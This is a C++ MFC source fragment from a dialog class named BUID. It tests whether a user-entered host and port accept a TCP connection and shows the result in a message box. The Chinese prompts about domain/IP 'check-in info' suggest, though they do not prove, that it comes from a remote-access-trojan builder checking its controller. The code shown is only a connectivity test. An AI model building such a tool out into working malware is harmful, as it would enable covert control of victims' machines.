	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;
	pHostent = gethostbyname(pThis->m_Host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = htons(atoi(pThis->m_Port));

	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);

	connect(sRemote, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);

	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();

	if (bRet)
		strResult.Format("成功连接到主机%s的%s端口!", pThis->m_Host, pThis->m_Port);
	else
		strResult.Format("不能打开到主机%s的连接， 在端口 %s: 连接失败", pThis->m_Host, pThis->m_Port);
	AfxMessageBox(strResult);
	return -1;
}
void BUID::OnTestMaster1()
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if (!m_Host.GetLength() || !m_Port)
	{
		MessageBox("请完整填写域名/IP(1)上线信息...", "提示...", MB_ICONINFORMATION);
		return;
	}
	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
	// 	m_testBtn1.EnableWindow(FALSE);
	// 	// 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster1, this, 0, NULL);
	// 	TestMaster1();
}


void BUID::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	BUID::OnOK();
}
